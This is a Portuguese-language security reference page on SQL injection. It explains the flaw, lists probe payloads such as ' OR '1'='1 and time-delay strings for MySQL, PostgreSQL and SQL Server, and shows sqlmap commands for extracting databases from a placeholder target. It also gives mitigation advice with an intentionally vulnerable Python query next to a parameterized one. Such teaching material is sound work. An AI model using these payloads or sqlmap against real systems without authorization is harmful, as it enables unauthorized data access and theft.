---
title: SQL Injection
description: Injeção de SQL em parâmetros da aplicação.
order: 1
---

## O que é

A aplicação monta uma query SQL concatenando entrada do usuário. Com isso, o
atacante altera a lógica da query e pode ler, modificar ou apagar dados.

## Como identificar

Teste cada parâmetro (query string, corpo, cabeçalhos, cookies) com caracteres
que quebram a sintaxe e observe mudanças na resposta:

```text
'
"
' OR '1'='1
' AND '1'='2
```

| Tipo | Sinal |
|---|---|
| Baseada em erro | Mensagem de erro do banco na resposta |
| Boolean-based blind | Resposta muda entre condição verdadeira e falsa |
| Time-based blind | Resposta atrasa com `SLEEP`/`pg_sleep`/`WAITFOR DELAY` |
| UNION-based | Dados de outra tabela aparecem na página |

Exemplos de atraso por banco:

```text
-- MySQL
' AND SLEEP(5)-- -
-- PostgreSQL
'; SELECT pg_sleep(5)--
-- SQL Server
'; WAITFOR DELAY '0:0:5'--
```

## Exploração

Depois de confirmar manualmente, o `sqlmap` automatiza a extração:

```bash
sqlmap -u "https://alvo.exemplo/produto?id=1" --batch --level 3 --risk 2
sqlmap -r requisicao.txt -p id --dbs
```

> Use `-r` com a requisição salva do Burp para manter cookies e cabeçalhos.
{: .tip }

## Mitigação

- Use **queries parametrizadas** (prepared statements) em todo acesso ao banco.
- Não concatene entrada em nomes de tabela/coluna; use uma allowlist.
- Conta do banco com o menor privilégio necessário.

```python
# vulnerável
cur.execute(f"SELECT * FROM produtos WHERE id = {id}")
# correto
cur.execute("SELECT * FROM produtos WHERE id = %s", (id,))
```
